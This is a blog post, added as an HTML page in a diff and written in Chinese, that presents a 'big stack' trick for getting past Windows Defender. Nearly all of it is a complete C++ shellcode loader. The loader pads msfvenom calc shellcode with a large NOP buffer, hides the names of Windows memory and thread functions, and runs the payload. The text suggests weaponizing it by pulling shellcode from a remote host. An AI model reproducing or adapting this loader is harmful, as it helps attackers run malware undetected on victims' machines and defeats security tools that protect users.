@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>Big Stack bypass</title>
+    <meta name="description" content="Big stack bypass defender code">
+    <meta name="keywords" content='code, bypass, trick'>
+
+    <meta property="og:url" content="https://gokarna-hugo.netlify.app/posts/2023/bigstack/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Big Stack bypass">
+    <meta property="og:description" content="Big stack bypass defender code">
+    <meta property="og:image" content="/images/home.jpg">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Big Stack bypass">
+    <meta name="twitter:description" content="Big stack bypass defender code">
+    <meta property="twitter:domain" content="https://gokarna-hugo.netlify.app/posts/2023/bigstack/">
+    <meta property="twitter:url" content="https://gokarna-hugo.netlify.app/posts/2023/bigstack/">
+    <meta name="twitter:image" content="/images/home.jpg">
+
+    
+    <link rel="canonical" href="https://gokarna-hugo.netlify.app/posts/2023/bigstack/" />
+
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/normalize.min.css" media="print" onload="this.media='all'">
+    <link rel="stylesheet" type="text/css" href="https://gokarna-hugo.netlify.app/css/main.css">
+    <link disabled id="dark-theme" rel="stylesheet" href="https://gokarna-hugo.netlify.app/css/dark.css">
+
+    <script src="https://gokarna-hugo.netlify.app/js/svg-injector.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/feather-icons.min.js"></script>
+    <script src="https://gokarna-hugo.netlify.app/js/main.js"></script>
+
+    
+    
+        <!-- KaTeX -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css" integrity="sha384-Xi8rHCmBmhbuyyhbI88391ZKP2dmfnOl4rT9ZfRI7mLTdk1wblIUnrIq35nqwEvC" crossorigin="anonymous">
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.js" integrity="sha384-X/XCfMm41VSsqRNQgDerQczD69XqmjOOOwYQvr/uuC+j4OPoNhVgjdGFwhvN02Ja" crossorigin="anonymous"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+    <script>
+      document.addEventListener("DOMContentLoaded", function() {
+        renderMathInElement(document.body, {
+          // customised options
+          // • auto-render specific keys, e.g.:
+          delimiters: [
+            {left: '$$', right: '$$', display: true},
+            {left: '$', right: '$', display: false},
+          ],
+          // • rendering keys, e.g.:
+          throwOnError : false
+        });
+      });
+    </script>
+  
+    
+</head>
+<body>
+        <script type="text/javascript">
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://gokarna-hugo.netlify.app">
+                <img src="https://gokarna-hugo.netlify.app/images/home.jpg" alt="avatar" />
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://gokarna-hugo.netlify.app">2867a0</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span id="dark-theme-toggle-screen-reader-target" class="sr-only"></span>
+                <a>
+                    <span id="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span id="hamburger-menu-toggle-screen-reader-target" class="sr-only">menu</span>
+                <a>
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/"><span data-feather='home'></span> Home </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/posts"><span data-feather='book'></span> Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/tags/"><span data-feather='tag'></span> Tags </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://gokarna-hugo.netlify.app/about/"><span data-feather='code'></span> About </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://github.com/2867a0"><span data-feather='github'></span>  </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span id="dark-theme-toggle-screen-reader-target" class="sr-only">theme</span>
+                    <a>
+                        <span id="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>Big Stack bypass</h1>
+        <small role="doc-subtitle">Big stack bypass defender code</small>
+        <p class="post-date">
+            February 13, 2023
+        </p>
+
+        <ul class="post-tags">
+        
+            <li class="post-tag"><a href="https://gokarna-hugo.netlify.app/tags/code">code</a></li>
+        
+            <li class="post-tag"><a href="https://gokarna-hugo.netlify.app/tags/bypass">bypass</a></li>
+        
+            <li class="post-tag"><a href="https://gokarna-hugo.netlify.app/tags/trick">trick</a></li>
+        
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p>
+            <p>[TOC]</p>
+<p>2022年底国外技术人员发现的技巧，在内存中分配一个大的堆栈，defender就检测不了了。</p>
+<p>测试用的是x64 metasploit 生成的 calc，原文中是硬编码栈内容，生成非常大。下面的代码时创建一个动态数组，将shellcode放到数组末尾，武器化可以远程拉取shellcode。</p>
+<p>visual studio编译需要设置字符集为多字节、堆栈提交大小为200000，堆栈大小可以自己定义</p>
+<p><img src="/images/2023/bigstack/1.png" alt="visual studio"></p>
+<p>修改后的完整代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;random&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">LPVOID</span> (WINAPI<span style="color:#f92672">*</span> VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (WINAPI<span style="color:#f92672">*</span> VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">HANDLE</span> (WINAPI<span style="color:#f92672">*</span> CreateThread_t)(LPSECURITY_ATTRIBUTES   lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE  lpStartAddress, __drv_aliasesMem LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> sVirtualProtect[] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;V&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;P&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;o&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>, <span style="color:#ae81ff">0x0</span> };
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> sVirtualAlloc[] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;V&#39;</span>,<span style="color:#e6db74">&#39;i&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;u&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;A&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;l&#39;</span>,<span style="color:#e6db74">&#39;o&#39;</span>,<span style="color:#e6db74">&#39;c&#39;</span>,<span style="color:#ae81ff">0x0</span> };
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> sCreateThread[] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#39;C&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;t&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;T&#39;</span>,<span style="color:#e6db74">&#39;h&#39;</span>,<span style="color:#e6db74">&#39;r&#39;</span>,<span style="color:#e6db74">&#39;e&#39;</span>,<span style="color:#e6db74">&#39;a&#39;</span>,<span style="color:#e6db74">&#39;d&#39;</span>,<span style="color:#ae81ff">0x0</span>, };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define STACKSIZE 2000000
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span> (VOID) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//msfvenom calc payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe -b &#39;\x00\x0A\x0D&#39; -f exe -o a.exe
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> calcPayload[] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0xfc</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xe4</span>, <span style="color:#ae81ff">0xf0</span>, <span style="color:#ae81ff">0xe8</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xd2</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x0f</span>, <span style="color:#ae81ff">0xb7</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4a</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x02</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xe2</span>, <span style="color:#ae81ff">0xed</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x42</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x85</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0x74</span>, <span style="color:#ae81ff">0x67</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x18</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0xe3</span>, <span style="color:#ae81ff">0x56</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x34</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd6</span>, <span style="color:#ae81ff">0x4d</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0xc0</span>, <span style="color:#ae81ff">0xac</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0xc9</span>, <span style="color:#ae81ff">0x0d</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xc1</span>, <span style="color:#ae81ff">0x38</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xf1</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x03</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x08</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x39</span>, <span style="color:#ae81ff">0xd1</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0xd8</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x24</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x66</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x0c</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x40</span>, <span style="color:#ae81ff">0x1c</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x04</span>, <span style="color:#ae81ff">0x88</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xd0</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xec</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x52</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x58</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x5a</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x12</span>, <span style="color:#ae81ff">0xe9</span>, <span style="color:#ae81ff">0x57</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x8d</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0x31</span>, <span style="color:#ae81ff">0x8b</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x87</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x1d</span>, <span style="color:#ae81ff">0x2a</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xba</span>, <span style="color:#ae81ff">0xa6</span>, <span style="color:#ae81ff">0x95</span>, <span style="color:#ae81ff">0xbd</span>, <span style="color:#ae81ff">0x9d</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x83</span>, <span style="color:#ae81ff">0xc4</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x3c</span>, <span style="color:#ae81ff">0x06</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x80</span>, <span style="color:#ae81ff">0xfb</span>, <span style="color:#ae81ff">0xe0</span>, <span style="color:#ae81ff">0x75</span>, <span style="color:#ae81ff">0x05</span>, <span style="color:#ae81ff">0xbb</span>, <span style="color:#ae81ff">0x47</span>, <span style="color:#ae81ff">0x13</span>, <span style="color:#ae81ff">0x72</span>, <span style="color:#ae81ff">0x6f</span>, <span style="color:#ae81ff">0x6a</span>, <span style="color:#ae81ff">0x00</span>, <span style="color:#ae81ff">0x59</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0x89</span>, <span style="color:#ae81ff">0xda</span>, <span style="color:#ae81ff">0xff</span>, <span style="color:#ae81ff">0xd5</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x6c</span>, <span style="color:#ae81ff">0x63</span>, <span style="color:#ae81ff">0x2e</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x78</span>, <span style="color:#ae81ff">0x65</span>, <span style="color:#ae81ff">0x00</span> };
+</span></span><span style="display:flex;"><span>    size_t calcPayload_len <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span> (calcPayload);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> finalPayload;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> finalPayloadLen <span style="color:#f92672">=</span> calcPayload_len <span style="color:#f92672">+</span> STACKSIZE;
+</span></span><span style="display:flex;"><span>    finalPayload <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)malloc ((finalPayloadLen) <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span> (<span style="color:#66d9ef">char</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( finalPayload <span style="color:#f92672">==</span> NULL )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    memset (finalPayload, <span style="color:#e6db74">&#39;\x90&#39;</span>, finalPayloadLen);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>( size_t i <span style="color:#f92672">=</span> STACKSIZE; i <span style="color:#f92672">&lt;</span> finalPayloadLen; i<span style="color:#f92672">++</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(finalPayload <span style="color:#f92672">+</span> i) <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(calcPayload <span style="color:#f92672">+</span> i <span style="color:#f92672">-</span> STACKSIZE);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> exec_mem;
+</span></span><span style="display:flex;"><span>    BOOL rv;
+</span></span><span style="display:flex;"><span>    HANDLE th;
+</span></span><span style="display:flex;"><span>    DWORD oldprotect <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//function pointers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VirtualAlloc_t VirtualAlloc_p <span style="color:#f92672">=</span> (VirtualAlloc_t)GetProcAddress
+</span></span><span style="display:flex;"><span>    (
+</span></span><span style="display:flex;"><span>        GetModuleHandle ((LPCSTR)<span style="color:#e6db74">&#34;KErnEl32.DLl&#34;</span>),
+</span></span><span style="display:flex;"><span>        (LPCSTR)sVirtualAlloc
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    VirtualProtect_t VirtualProtect_p <span style="color:#f92672">=</span> (VirtualProtect_t)GetProcAddress
+</span></span><span style="display:flex;"><span>    (
+</span></span><span style="display:flex;"><span>        GetModuleHandle ((LPCSTR)<span style="color:#e6db74">&#34;kErnEl32.DLl&#34;</span>),
+</span></span><span style="display:flex;"><span>        (LPCSTR)sVirtualProtect
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>    CreateThread_t CreateThread_p <span style="color:#f92672">=</span> (CreateThread_t)GetProcAddress
+</span></span><span style="display:flex;"><span>    (GetModuleHandle ((LPCSTR)<span style="color:#e6db74">&#34;kERnEl32.DLl&#34;</span>),
+</span></span><span style="display:flex;"><span>     (LPCSTR)sCreateThread
+</span></span><span style="display:flex;"><span>    );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;payload length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, finalPayloadLen);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a memory buffer for payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    exec_mem <span style="color:#f92672">=</span> VirtualAlloc_p (NULL, finalPayloadLen, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( exec_mem <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Copy payload to program memory ; this gets inlined
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    RtlMoveMemory (exec_mem, finalPayload, finalPayloadLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Make payload executable
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    rv <span style="color:#f92672">=</span> VirtualProtect_p (exec_mem, finalPayloadLen, PAGE_EXECUTE_READ, <span style="color:#f92672">&amp;</span>oldprotect);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Run payload
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>( rv <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> ) {
+</span></span><span style="display:flex;"><span>        th <span style="color:#f92672">=</span> CreateThread_p (<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, (LPTHREAD_START_ROUTINE)exec_mem, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>        WaitForSingleObject (th, INFINITE);
+</span></span><span style="display:flex;"><span>        free (finalPayload);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+        </p>
+    </div>
+
+    <div class="prev-next">
+        
+    </div>
+</div>
+
+<aside class="post-toc">
+    <nav id="toc">
+        <nav id="TableOfContents"></nav>
+    </nav>
+</aside>
+
+
+
+    
+
+        </main><footer class="footer">
+    <span>&copy; 2023 The Marauders</span>
+    <span>
+        Made with &#10084;&#65039; using <a target="_blank" href="https://github.com/526avijitgupta/gokarna">Gokarna</a>
+    </span>
+</footer>
+</body>
+</html>
